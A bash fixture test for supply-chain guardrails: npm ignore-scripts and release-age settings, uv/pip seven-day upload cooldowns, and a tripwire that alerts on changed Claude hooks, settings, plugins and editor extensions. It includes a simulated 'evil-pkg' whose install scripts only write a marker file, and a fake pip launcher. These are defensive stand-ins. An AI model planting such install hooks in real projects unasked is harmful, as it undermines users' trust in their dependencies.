#!/usr/bin/env bash
# guardrails.test.sh (hq-8cry.4): fixture test for ops/security/guardrails.sh
# and ops/security/hook-tripwire.sh.
#
# guardrails: apply writes one managed block into a fixture npmrc (idempotent,
# other lines kept, a stale block replaced); check reads the effective npm
# config and fails on ignore-scripts=false, a missing release age, or a rig
# .npmrc that turns scripts back on; a real offline npm install of a packed
# tarball does NOT run its postinstall; scripts runs install scripts only for
# allowlisted packages.
#
# hq-pgbpq.3: apply also writes uv exclude-newer = "7 days" and pip
# uploaded-prior-to = P7D into fixture configs (stale overrides dropped,
# idempotent); check fails on a missing config, an exported override, a
# per-package exemption, a [pip]-only uv window, a pip value outside [global],
# a project uv.toml/pyproject/pip.conf override and a venv pip older than 26.1
# (read from dist-info, never by running a launcher in a checkout); against a local JSON index, uv and pip refuse a release
# uploaded an hour ago and still take one from last month.
#
# tripwire: a fixture HOME and HQ (git repos with .claude/, hooks, a VS Code
# extension). First run records a baseline and stays quiet; a committed change
# is quiet; an uncommitted edit, a new hook, a changed extension, a deleted
# hook and a changed ~/.claude/settings.json each raise one urgent notify that
# names the path and never the content; an egress-ledger WebFetch grant in
# settings.local.json is quiet but a new hooks key there is not; worktrees are
# ignored. hq-8cry.14: an egress sandbox.network.allowedDomains entry is quiet
# too, any other sandbox key still alerts.
#
# hq-8cry.8 gaps: check scans all of ~/hq (worktrees and node_modules pruned)
# for .npmrc; the tripwire hashes ops/scripts/hook-*.sh and every script a
# settings hook names by path, the MCP servers in ~/.claude.json, and the code
# under ~/.claude/plugins (session markers and the marketplace catalog are
# quiet); a root-side copy of the baseline catches a deleted or edited baseline
# even when the log is gone too; a baseline from before this coverage adopts
# the new paths once, quietly.
#
# hq-8cry.10: relative hook commands resolve against the project dir, quoted
# paths with spaces stay one path (split, never run), statusLine.command and
# every plugin hook or MCP entry point are followed, any extension, as is
# every file under a plugin's hooks/ and scripts/; a change under
# plugins/synced alerts at default; a failed mirror write alerts at default
# and exits nonzero.
# Round two: a hook or MCP server wrapped in bash -c or sh -c is followed, a
# bare script name resolves against the project dir (never PATH), repo-root
# .mcp.json files are hashed and followed, the coverage 2 upgrade alerts on an
# absolute hook target coverage 2 already followed, and a failed python helper
# alerts at default, exits nonzero and keeps the baseline.
#
# Run: bash ops/security/tests/guardrails.test.sh   (exit 0 = pass)
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
G="$HERE/../guardrails.sh"
TW="$HERE/../hook-tripwire.sh"
[ -x "$G" ] || { echo "FAIL cannot find guardrails.sh at $G"; exit 1; }
[ -x "$TW" ] || { echo "FAIL cannot find hook-tripwire.sh at $TW"; exit 1; }

unset HQ_ROOT GUARD_NPMRC GUARD_ALLOWLIST GUARD_RIGS GUARD_ROOT UV_EXCLUDE_NEWER UV_CONFIG_FILE PIP_UPLOADED_PRIOR_TO PIP_CONFIG_FILE TRIPWIRE_HOME TRIPWIRE_HQ TRIPWIRE_STATE TRIPWIRE_NOTIFY TRIPWIRE_MIRROR
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT

fail=0
ok(){ printf 'PASS  %s\n' "$1"; }
no(){ printf 'FAIL  %s (%s)\n' "$1" "${2:-}"; fail=1; }

# --- guardrails: apply ----------------------------------------------------------
RC="$T/npmrc"
printf 'registry=https://registry.npmjs.org/\nfund=false\n' > "$RC"
export GUARD_NPMRC="$RC" GUARD_RIGS="$T/rigs-none" GUARD_CONFIG_HOME="$T/cfg"
"$G" apply >/dev/null 2>&1 || no "apply exits 0" "rc=$?"
grep -qx 'ignore-scripts=true' "$RC" && ok "apply sets ignore-scripts=true" || no "apply sets ignore-scripts=true" "$(cat "$RC")"
grep -qx 'min-release-age=7' "$RC" && ok "apply sets min-release-age=7" || no "apply sets min-release-age=7" "$(cat "$RC")"
grep -qx 'fund=false' "$RC" && grep -qx 'registry=https://registry.npmjs.org/' "$RC" \
  && ok "apply keeps unrelated lines" || no "apply keeps unrelated lines" "$(cat "$RC")"
cp "$RC" "$T/npmrc.once"; "$G" apply >/dev/null 2>&1
cmp -s "$RC" "$T/npmrc.once" && ok "apply is idempotent" || no "apply is idempotent" "$(diff "$T/npmrc.once" "$RC")"
sed -i 's/^min-release-age=7$/min-release-age=2/' "$RC"; "$G" apply >/dev/null 2>&1
[ "$(grep -c '^min-release-age=' "$RC")" = 1 ] && grep -qx 'min-release-age=7' "$RC" \
  && ok "apply replaces a stale block" || no "apply replaces a stale block" "$(cat "$RC")"
printf 'ignore-scripts=false\n' > "$T/npmrc.conflict"
GUARD_NPMRC="$T/npmrc.conflict" "$G" apply >/dev/null 2>&1
grep -qx 'ignore-scripts=false' "$T/npmrc.conflict" && no "apply drops a conflicting line outside the block" "$(cat "$T/npmrc.conflict")" \
  || ok "apply drops a conflicting line outside the block"

# --- guardrails: check (real npm, fixture userconfig) ----------------------------
if command -v npm >/dev/null; then
  out="$("$G" check 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "check passes after apply" || no "check passes after apply" "rc=$rc $out"
  printf 'ignore-scripts=false\n' > "$T/npmrc.bad"
  out="$(GUARD_NPMRC="$T/npmrc.bad" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'ignore-scripts' <<<"$out" && ok "check fails on ignore-scripts=false" || no "check fails on ignore-scripts=false" "rc=$rc $out"
  printf 'ignore-scripts=true\n' > "$T/npmrc.noage"
  out="$(GUARD_NPMRC="$T/npmrc.noage" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'min-release-age' <<<"$out" && ok "check fails without a release age" || no "check fails without a release age" "rc=$rc $out"
  mkdir -p "$T/rigs/alpha" && printf 'ignore-scripts=false\n' > "$T/rigs/alpha/.npmrc"
  out="$(GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'alpha/.npmrc' <<<"$out" && ok "check fails on a rig .npmrc that re-enables scripts" || no "check fails on a rig .npmrc that re-enables scripts" "rc=$rc $out"
  for val in '"false"' 0 no False; do
    printf 'ignore-scripts=%s\n' "$val" > "$T/rigs/alpha/.npmrc"
    out="$(GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
    [ $rc = 1 ] && grep -q 'alpha/.npmrc' <<<"$out" && ok "check fails on ignore-scripts=$val in a rig" || no "check fails on ignore-scripts=$val in a rig" "rc=$rc $out"
  done
  printf 'registry=https://registry.npmjs.org/\nignore-scripts=true\n' > "$T/rigs/alpha/.npmrc"
  out="$(GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "check passes on a harmless rig .npmrc" || no "check passes on a harmless rig .npmrc" "rc=$rc $out"
  rm -f "$T/rigs/alpha/.npmrc"
  printf 'userconfig=/dev/null\n' > "$T/rigs/alpha/.npmrc"
  out="$(GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'alpha/.npmrc' <<<"$out" && ok "check fails on a userconfig redirect in a rig" || no "check fails on a userconfig redirect in a rig" "rc=$rc $out"
  rm -f "$T/rigs/alpha/.npmrc"
  mkdir -p "$T/rigs/alpha/packages/apps/web/deep" && printf 'ignore-scripts=false\n' > "$T/rigs/alpha/packages/apps/web/deep/.npmrc"
  out="$(GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'deep/.npmrc' <<<"$out" && ok "check finds a deep subpackage .npmrc" || no "check finds a deep subpackage .npmrc" "rc=$rc $out"
  rm -rf "$T/rigs/alpha/packages"
  R="$T/hqroot"; mkdir -p "$R/ops/tools" "$R/.claude/worktrees/w9" "$R/rigs/beta/node_modules/x"
  printf 'ignore-scripts=false\n' > "$R/.claude/worktrees/w9/.npmrc"
  printf 'ignore-scripts=false\n' > "$R/rigs/beta/node_modules/x/.npmrc"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "check skips worktrees and node_modules under hq" || no "check skips worktrees and node_modules under hq" "rc=$rc $out"
  printf 'ignore-scripts=false\n' > "$R/ops/tools/.npmrc"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'ops/tools/.npmrc' <<<"$out" && ok "check finds an .npmrc anywhere in hq, not only rigs" || no "check finds an .npmrc anywhere in hq, not only rigs" "rc=$rc $out"
  printf 'ignore-scripts=false\n' > "$T/ro.npmrc"; chmod 444 "$T/ro.npmrc"
  if [ "$(id -u)" != 0 ]; then
    GUARD_NPMRC="$T/ro.npmrc" "$G" apply >/dev/null 2>&1; rc=$?
    [ $rc != 0 ] && ok "apply fails when it cannot write the npmrc" || no "apply fails when it cannot write the npmrc" "rc=$rc"
  fi
  printf 'ignore-scripts=false\nmin-release-age=0\n' > "$T/unsafe.npmrc"
  out="$(env -u GUARD_NPMRC npm_config_userconfig="$T/unsafe.npmrc" GUARD_RIGS="$T/rigs" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'ignore-scripts=false' <<<"$out" && ok "check fails on an exported unsafe userconfig" || no "check fails on an exported unsafe userconfig" "rc=$rc $out"

  # --- real install: a packed tarball's postinstall must not run ----------------
  P="$T/pkg-evil"; mkdir -p "$P"
  cat > "$P/package.json" <<EOF
{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"node -e \"require('fs').writeFileSync('$T/evil-ran','x')\""}}
EOF
  (cd "$P" && npm_config_userconfig="$RC" npm pack --silent --pack-destination "$T" >/dev/null 2>&1)
  A="$T/app"; mkdir -p "$A"; printf '{"name":"app","version":"1.0.0"}\n' > "$A/package.json"
  (cd "$A" && npm_config_userconfig="$RC" npm install --offline --no-audit --no-fund "$T/evil-pkg-1.0.0.tgz" >/dev/null 2>&1); rc=$?
  [ $rc = 0 ] && [ -d "$A/node_modules/evil-pkg" ] && ok "npm install still succeeds under the guardrails" || no "npm install still succeeds under the guardrails" "rc=$rc"
  [ ! -e "$T/evil-ran" ] && ok "install script of a dependency does not run" || no "install script of a dependency does not run"

  # --- scripts: only allowlisted packages run their install scripts -------------
  for n in good-pkg evil-pkg; do
    mkdir -p "$A/node_modules/$n"
    cat > "$A/node_modules/$n/package.json" <<EOF
{"name":"$n","version":"1.0.0","scripts":{"install":"node -e \"require('fs').writeFileSync('$T/$n-ran','x')\""}}
EOF
  done
  rm -f "$T/evil-ran" "$A/package-lock.json"
  printf '{"name":"app","version":"1.0.0","dependencies":{"good-pkg":"1.0.0","evil-pkg":"1.0.0"}}\n' > "$A/package.json"
  out="$(GUARD_ALLOWLIST="good-pkg absent-pkg" "$G" scripts "$A" 2>&1)"; rc=$?
  [ $rc = 0 ] && [ -e "$T/good-pkg-ran" ] && ok "scripts runs an allowlisted package" || no "scripts runs an allowlisted package" "rc=$rc $out"
  [ ! -e "$T/evil-pkg-ran" ] && ok "scripts skips a package not on the allowlist" || no "scripts skips a package not on the allowlist" "$out"
else
  no "npm on PATH" "npm missing"
fi

# --- hq-pgbpq.3: Python install cooldown (uv exclude-newer, pip uploaded-prior-to)
C="$GUARD_CONFIG_HOME"
head -n3 "$C/uv/uv.toml" | sed -n 2p | grep -qx 'exclude-newer = "7 days"' && ok "apply writes exclude-newer = \"7 days\" at the top of uv.toml" || no "apply writes uv exclude-newer" "$(cat "$C/uv/uv.toml")"
grep -qx 'uploaded-prior-to = P7D' "$C/pip/pip.conf" && head -n1 "$C/pip/pip.conf" | grep -qx '\[global\]' \
  && ok "apply writes [global] uploaded-prior-to = P7D to pip.conf" || no "apply writes pip uploaded-prior-to" "$(cat "$C/pip/pip.conf")"
C2="$T/cfg2"; mkdir -p "$C2/uv" "$C2/pip"
printf 'native-tls = true\n\n[pip]\nexclude-newer = "2099-01-01"\nindex-url = "https://pypi.org/simple"\n' > "$C2/uv/uv.toml"
printf '[install]\nuploaded-prior-to = P0D\n\n[global]\ntimeout = 60\n' > "$C2/pip/pip.conf"
GUARD_CONFIG_HOME="$C2" "$G" apply >/dev/null 2>&1
[ "$(grep -c 'exclude-newer' "$C2/uv/uv.toml")" = 1 ] && grep -qx 'index-url = "https://pypi.org/simple"' "$C2/uv/uv.toml" && grep -qx 'native-tls = true' "$C2/uv/uv.toml" \
  && ok "apply drops a stale [pip] exclude-newer and keeps the rest of uv.toml" || no "apply rewrites uv.toml" "$(cat "$C2/uv/uv.toml")"
[ "$(grep -c 'uploaded-prior-to' "$C2/pip/pip.conf")" = 1 ] && [ "$(grep -c '^\[global\]' "$C2/pip/pip.conf")" = 1 ] && grep -qx 'timeout = 60' "$C2/pip/pip.conf" \
  && sed -n '/^\[global\]/,/^\[/p' "$C2/pip/pip.conf" | grep -qx 'uploaded-prior-to = P7D' \
  && ok "apply puts the pip block under the existing [global] and drops the [install] override" || no "apply rewrites pip.conf" "$(cat "$C2/pip/pip.conf")"
C3="$T/cfg3"; mkdir -p "$C3/uv" "$C3/pip"
printf '"exclude-newer" = "1 day"\n' > "$C3/uv/uv.toml"; printf '[global] # defaults\ntimeout = 60\n' > "$C3/pip/pip.conf"
GUARD_CONFIG_HOME="$C3" "$G" apply >/dev/null 2>&1
[ "$(grep -c 'exclude-newer' "$C3/uv/uv.toml")" = 1 ] && [ "$(grep -c '^\[global\]' "$C3/pip/pip.conf")" = 1 ] \
  && ok "apply handles a quoted uv key and a commented [global] header" || no "apply handles quoted key and commented header" "$(cat "$C3/uv/uv.toml" "$C3/pip/pip.conf")"
printf '[global]\na = 1\n[global]\nb = 2\n' > "$C3/pip/pip.conf"; cp "$C3/pip/pip.conf" "$T/pip.broken"
GUARD_CONFIG_HOME="$C3" "$G" apply >/dev/null 2>&1; rc=$?
[ $rc != 0 ] && cmp -s "$C3/pip/pip.conf" "$T/pip.broken" && ok "apply refuses to write a pip.conf that does not parse" || no "apply refuses a pip.conf that does not parse" "rc=$rc $(cat "$C3/pip/pip.conf")"
cp "$C2/uv/uv.toml" "$T/uv.once"; cp "$C2/pip/pip.conf" "$T/pip.once"
GUARD_CONFIG_HOME="$C2" "$G" apply >/dev/null 2>&1
cmp -s "$C2/uv/uv.toml" "$T/uv.once" && cmp -s "$C2/pip/pip.conf" "$T/pip.once" && ok "uv and pip apply are idempotent" \
  || no "uv and pip apply are idempotent" "$(diff "$T/uv.once" "$C2/uv/uv.toml"; diff "$T/pip.once" "$C2/pip/pip.conf")"

if command -v uv >/dev/null; then
  out="$("$G" check 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "check passes with uv and pip configured" || no "check passes with uv and pip configured" "rc=$rc $out"
  out="$(GUARD_CONFIG_HOME="$T/cfg-none" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'uv exclude-newer is not' <<<"$out" && grep -q 'cfg-none/pip/pip.conf: no \[global\] uploaded-prior-to' <<<"$out" \
    && ok "check fails on a missing uv.toml and a missing pip.conf" || no "check fails on missing python config" "rc=$rc $out"
  out="$(UV_EXCLUDE_NEWER=2099-01-01T00:00:00Z "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'Absolute' <<<"$out" && ok "check fails on an exported UV_EXCLUDE_NEWER" || no "check fails on UV_EXCLUDE_NEWER" "rc=$rc $out"
  mkdir -p "$T/cfg-pkg/uv"; cp "$C/pip" -r "$T/cfg-pkg/"; printf 'exclude-newer = "7 days"\nexclude-newer-package = { evil = false }\n' > "$T/cfg-pkg/uv/uv.toml"
  out="$(GUARD_CONFIG_HOME="$T/cfg-pkg" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'uv exclude-newer is not' <<<"$out" && ok "check fails on a per-package uv exemption" || no "check fails on a per-package uv exemption" "rc=$rc $out"
  R="$T/pyroot"; mkdir -p "$R/rigs/py/sub" "$R/.claude/worktrees/w/x"
  printf 'exclude-newer = "1 day"\n' > "$R/.claude/worktrees/w/x/uv.toml"
  printf '[project]\nname = "py"\nversion = "0"\n' > "$R/rigs/py/pyproject.toml"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "check passes a plain pyproject and skips worktrees" || no "check passes a plain pyproject and skips worktrees" "rc=$rc $out"
  printf '[tool.uv]\nexclude-newer = "1 day"\n' >> "$R/rigs/py/pyproject.toml"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'rigs/py/pyproject.toml sets its own exclude-newer' <<<"$out" && ok "check fails on a project [tool.uv] exclude-newer" || no "check fails on a project [tool.uv] override" "rc=$rc $out"
  printf '[project]\nname = "py"\nversion = "0"\n' > "$R/rigs/py/pyproject.toml"
  printf '[pip]\nexclude_newer = "2099-01-01"\n' > "$R/rigs/py/sub/uv.toml"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'sub/uv.toml sets its own exclude-newer' <<<"$out" && ok "check fails on a project uv.toml override" || no "check fails on a project uv.toml override" "rc=$rc $out"
  rm -f "$R/rigs/py/sub/uv.toml"
  printf '[install]\nuploaded-prior-to = P0D\n' > "$R/rigs/py/sub/pip.conf"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'sub/pip.conf overrides uploaded-prior-to' <<<"$out" && ok "check fails on a project pip.conf override" || no "check fails on a project pip.conf override" "rc=$rc $out"
  rm -f "$R/rigs/py/sub/pip.conf"
  mkdir -p "$R/rigs/py/.venv/bin" "$R/rigs/py/.venv/lib/python3.12/site-packages/pip-25.3.dist-info"
  printf '#!/bin/sh\ntouch "%s/pip-ran"\necho "pip 26.2 from /x (python 3.12)"\n' "$T" > "$R/rigs/py/.venv/bin/pip"; chmod +x "$R/rigs/py/.venv/bin/pip"
  out="$(GUARD_ROOT="$R" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'venv pip 25.3 is older than 26.1' <<<"$out" && ok "check fails on a venv pip older than 26.1 (pip3-only venvs too)" || no "check fails on an old venv pip" "rc=$rc $out"
  [ ! -e "$T/pip-ran" ] && ok "check never runs a pip launcher found in a checkout" || no "check never runs a pip launcher found in a checkout"
  rm -rf "$R/rigs/py/.venv"
  mkdir -p "$T/cfg-pipsec/uv"; cp -r "$C/pip" "$T/cfg-pipsec/"; printf '[pip]\nexclude-newer = "7 days"\n' > "$T/cfg-pipsec/uv/uv.toml"
  out="$(GUARD_CONFIG_HOME="$T/cfg-pipsec" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'uv exclude-newer is not' <<<"$out" && ok "check fails on a uv window set only for the pip interface" || no "check fails on a [pip]-only uv window" "rc=$rc $out"
  mkdir -p "$T/cfg-dl/pip"; cp -r "$C/uv" "$T/cfg-dl/"; printf '[download]\nuploaded-prior-to = P7D\n' > "$T/cfg-dl/pip/pip.conf"
  out="$(GUARD_CONFIG_HOME="$T/cfg-dl" "$G" check 2>&1)"; rc=$?
  [ $rc = 1 ] && grep -q 'no \[global\] uploaded-prior-to' <<<"$out" && ok "check fails on a pip value outside [global]" || no "check fails on a [download]-only pip value" "rc=$rc $out"

  # a real pip (uv's cached copy; skipped when the cache is empty and offline)
  PIPDIR="$(cd / && uvx --no-config --offline pip --version 2>/dev/null | sed -n 's|^pip [^ ]* from \(.*\)/lib/python[^/]*/site-packages/pip .*|\1|p')"
  PIPX=""; [ -x "$PIPDIR/bin/pip" ] && PIPX="$PIPDIR/bin/pip"
  if [ -n "$PIPX" ]; then
    mkdir -p "$T/pipbin"; ln -sf "$PIPX" "$T/pipbin/pip"
    out="$(PATH="$T/pipbin:$PATH" "$G" check 2>&1)"; rc=$?
    [ $rc = 0 ] && ok "check passes a real pip 26.1+ that sees P7D" || no "check passes a real pip" "rc=$rc $out"
    out="$(PATH="$T/pipbin:$PATH" PIP_UPLOADED_PRIOR_TO=P0D "$G" check 2>&1)"; rc=$?
    [ $rc = 1 ] && grep -q "uploaded-prior-to='P0D'" <<<"$out" && ok "check fails on an exported PIP_UPLOADED_PRIOR_TO" || no "check fails on PIP_UPLOADED_PRIOR_TO" "rc=$rc $out"
    out="$(PATH="$T/pipbin:$PATH" PIP_CONFIG_FILE=/dev/null "$G" check 2>&1)"; rc=$?
    [ $rc = 1 ] && grep -q 'pip sees no global uploaded-prior-to' <<<"$out" && ok "check fails when PIP_CONFIG_FILE hides the config" || no "check fails on PIP_CONFIG_FILE=/dev/null" "rc=$rc $out"
  else
    printf 'SKIP  real pip checks (no cached pip for uvx --offline)\n'
  fi

  # --- real resolution: a release uploaded today is refused, last month's is used
  I="$T/index"; mkdir -p "$I/files"
  cat > "$T/index.py" <<'EOF'
import datetime, hashlib, http.server, json, os, sys, zipfile
root = sys.argv[1]
now = datetime.datetime.now(datetime.timezone.utc)
files = []
for ver, when in (("1.0", now - datetime.timedelta(days=30)), ("2.0", now - datetime.timedelta(hours=1))):
    name = f"cooldemo-{ver}-py3-none-any.whl"
    di = f"cooldemo-{ver}.dist-info"
    with zipfile.ZipFile(os.path.join(root, "files", name), "w") as z:
        z.writestr("cooldemo/__init__.py", "")
        z.writestr(f"{di}/METADATA", f"Metadata-Version: 2.1\nName: cooldemo\nVersion: {ver}\n")
        z.writestr(f"{di}/WHEEL", "Wheel-Version: 1.0\nGenerator: t\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
        z.writestr(f"{di}/RECORD", "")
    sha = hashlib.sha256(open(os.path.join(root, "files", name), "rb").read()).hexdigest()
    files.append({"filename": name, "url": f"/files/{name}", "hashes": {"sha256": sha},
                  "upload-time": when.strftime("%Y-%m-%dT%H:%M:%S.%fZ")})
page = json.dumps({"meta": {"api-version": "1.1"}, "name": "cooldemo", "versions": ["1.0", "2.0"], "files": files}).encode()
class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k): super().__init__(*a, directory=root, **k)
    def log_message(self, *a): pass
    def do_GET(self):
        if self.path.rstrip("/") == "/simple/cooldemo":
            self.send_response(200); self.send_header("Content-Type", "application/vnd.pypi.simple.v1+json")
            self.send_header("Content-Length", str(len(page))); self.end_headers(); self.wfile.write(page)
        else: super().do_GET()
s = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
open(os.path.join(root, "port"), "w").write(str(s.server_address[1]))
s.serve_forever()
EOF
  python3 -I "$T/index.py" "$I" & IPID=$!
  for _ in $(seq 50); do [ -s "$I/port" ] && break; sleep 0.1; done
  URL="http://127.0.0.1:$(cat "$I/port" 2>/dev/null)/simple/"
  uv venv -q --no-config "$T/venv" >/dev/null 2>&1
  out="$(cd "$T" && XDG_CONFIG_HOME="$C" uv pip install --python "$T/venv" --no-cache --dry-run --index-url "$URL" 'cooldemo==2.0' 2>&1)"; rc=$?
  [ $rc != 0 ] && ok "uv refuses a release uploaded an hour ago" || no "uv refuses a release uploaded an hour ago" "rc=$rc $out"
  out="$(cd "$T" && XDG_CONFIG_HOME="$C" uv pip install --python "$T/venv" --no-cache --dry-run --index-url "$URL" cooldemo 2>&1)"; rc=$?
  [ $rc = 0 ] && grep -q 'cooldemo==1.0' <<<"$out" && ok "uv still installs the 30-day-old release" || no "uv still installs the old release" "rc=$rc $out"
  out="$(cd "$T" && uv pip install --no-config --python "$T/venv" --no-cache --dry-run --index-url "$URL" 'cooldemo==2.0' 2>&1)"; rc=$?
  [ $rc = 0 ] && ok "control: uv without the config takes the new release" || no "control: uv without the config takes the new release" "rc=$rc $out"
  if [ -n "$PIPX" ]; then
    out="$(XDG_CONFIG_HOME="$C" "$PIPX" install --no-cache-dir --dry-run --index-url "$URL" 'cooldemo==2.0' 2>&1)"; rc=$?
    [ $rc != 0 ] && ok "pip refuses a release uploaded an hour ago" || no "pip refuses a release uploaded an hour ago" "rc=$rc $out"
    out="$(XDG_CONFIG_HOME="$C" "$PIPX" install --no-cache-dir --dry-run --index-url "$URL" cooldemo 2>&1)"; rc=$?
    [ $rc = 0 ] && grep -q 'cooldemo-1.0' <<<"$out" && ok "pip still installs the 30-day-old release" || no "pip still installs the old release" "rc=$rc $out"
    out="$(PIP_CONFIG_FILE=/dev/null "$PIPX" install --no-cache-dir --dry-run --index-url "$URL" 'cooldemo==2.0' 2>&1)"; rc=$?
    [ $rc = 0 ] && ok "control: pip without the config takes the new release" || no "control: pip without the config takes the new release" "rc=$rc $out"
  fi
  kill "$IPID" 2>/dev/null; wait "$IPID" 2>/dev/null
else
  printf 'SKIP  uv checks (no uv on PATH)\n'
fi

# --- tripwire fixture -------------------------------------------------------------
H="$T/home"; Q="$T/hq"; S="$T/state"; LOG="$T/notify.log"
mkdir -p "$H/.claude/hooks" "$H/.vscode-server/extensions/ext.one" "$Q/.claude/worktrees/w1/.claude" "$Q/rigs/alpha/.claude" "$T/bin"
printf '{"hooks":{}}\n' > "$H/.claude/settings.json"
printf '#!/bin/sh\n' > "$H/.claude/hooks/pre.sh"
printf 'module.exports = 1\n' > "$H/.vscode-server/extensions/ext.one/main.js"
cat > "$T/bin/notify" <<EOF
#!/usr/bin/env bash
printf '%s|%s|%s\n' "\$1" "\$2" "\$3" >> "$LOG"
EOF
chmod +x "$T/bin/notify"
gitq(){ git -C "$1" -c user.email=t@t -c user.name=t "${@:2}" >/dev/null 2>&1; }
mkdir -p "$Q/ops/scripts" "$T/ext"
printf '#!/bin/sh\n' > "$Q/ops/scripts/hook-guard.sh"; printf '#!/bin/sh\n' > "$Q/ops/scripts/other.sh"
printf '#!/bin/sh\necho ok\n' > "$T/ext/hook.sh"
printf '{"numStartups":1,"mcpServers":{},"projects":{"/a":{"allowedTools":[]}}}\n' > "$H/.claude.json"
P="$H/.claude/plugins"; mkdir -p "$P/cache/mk/p1/1.0/hooks" "$P/marketplaces/mk/plugins/p2/hooks" "$P/synced/s/p3/.in_use" "$P/.trash/t1"
printf '{"hooks":{}}\n' > "$P/cache/mk/p1/1.0/hooks/hooks.json"
printf '{"mk":{"source":{"source":"github","repo":"o/mk"},"lastUpdated":"2026-01-01"}}\n' > "$P/known_marketplaces.json"
printf 'x\n' > "$P/marketplaces/mk/plugins/p2/hooks/run.sh"; printf '{}\n' > "$P/plugin-directory-cache-v2.json"
printf 't\n' > "$P/.last_inuse_sweep"; printf '1\n' > "$P/synced/s/p3/.in_use/123"
gitq "$Q" init -q; printf '.claude/settings.local.json\n.claude/worktrees/\nrigs/\n' > "$Q/.gitignore"
printf '{"permissions":{"allow":[]}}\n' > "$Q/.claude/settings.json"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)"]}}\n' > "$Q/.claude/settings.local.json"
printf 'x\n' > "$Q/.claude/worktrees/w1/.claude/settings.json"
gitq "$Q" add -A; gitq "$Q" commit -qm init
gitq "$Q/rigs/alpha" init -q
printf '{}\n' > "$Q/rigs/alpha/.claude/settings.json"
gitq "$Q/rigs/alpha" add -A; gitq "$Q/rigs/alpha" commit -qm init
ln -s "$Q/rigs/alpha" "$Q/rigs/alias"   # a symlinked rig is the same rig

M="$T/mirror"; mkdir -p "$M"
export TRIPWIRE_HOME="$H" TRIPWIRE_HQ="$Q" TRIPWIRE_STATE="$S" TRIPWIRE_NOTIFY="$T/bin/notify" TRIPWIRE_MIRROR="$M"
run(){ : > "$LOG"; "$TW" >"$T/tw.out" 2>&1; echo $?; }
alerts(){ grep -c '^urgent|' "$LOG" 2>/dev/null || true; }

rc=$(run); [ "$rc" = 0 ] && [ -s "$S/hook-tripwire.tsv" ] && [ "$(alerts)" = 0 ] \
  && ok "first run records a baseline quietly" || no "first run records a baseline quietly" "rc=$rc alerts=$(alerts) $(cat "$T/tw.out")"
grep -q 'ext.one/main.js' "$S/hook-tripwire.tsv" && grep -q 'rigs/alpha/.claude/settings.json' "$S/hook-tripwire.tsv" \
  && grep -q '.claude/hooks/pre.sh' "$S/hook-tripwire.tsv" && ok "baseline covers home, hooks, rigs and extensions" \
  || no "baseline covers home, hooks, rigs and extensions" "$(cut -f1 "$S/hook-tripwire.tsv")"
grep -q 'worktrees' "$S/hook-tripwire.tsv" && no "worktrees are not watched" || ok "worktrees are not watched"
grep -q 'rigs/alias' "$S/hook-tripwire.tsv" && no "a symlinked rig is watched once" || ok "a symlinked rig is watched once"

rc=$(run); [ "$rc" = 0 ] && [ "$(alerts)" = 0 ] && ok "no change, no alert" || no "no change, no alert" "rc=$rc $(cat "$LOG")"

printf '{"model":"x"}\n' > "$Q/rigs/alpha/.claude/settings.json"; gitq "$Q/rigs/alpha" commit -qam change
rc=$(run); [ "$(alerts)" = 0 ] && ok "a committed change is quiet" || no "a committed change is quiet" "$(cat "$LOG")"

printf 'y\n' > "$Q/.claude/worktrees/w1/.claude/settings.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "a worktree change is quiet" || no "a worktree change is quiet" "$(cat "$LOG")"

printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "an egress WebFetch grant is quiet" || no "an egress WebFetch grant is quiet" "$(cat "$LOG")"

# hq-8cry.14: the egress ledger also appends to sandbox.network.allowedDomains
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{"allowedDomains":["b.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "a first egress allowedDomains entry is quiet" || no "a first egress allowedDomains entry is quiet" "$(cat "$LOG")"
printf '{"permissions":{"allow":["WebFetch(domain:a.example)","WebFetch(domain:b.example)"]},"sandbox":{"network":{"allowedDomains":["b.example","c.example"]}}}\n' > "$Q/.claude/settings.local.json"
rc=$(run); [ "$(alerts)" = 0 ] && ok "another egress allowedDomains entry is quiet" || no "another egress allowedDomains entry is quiet" "$(cat "$LOG")"
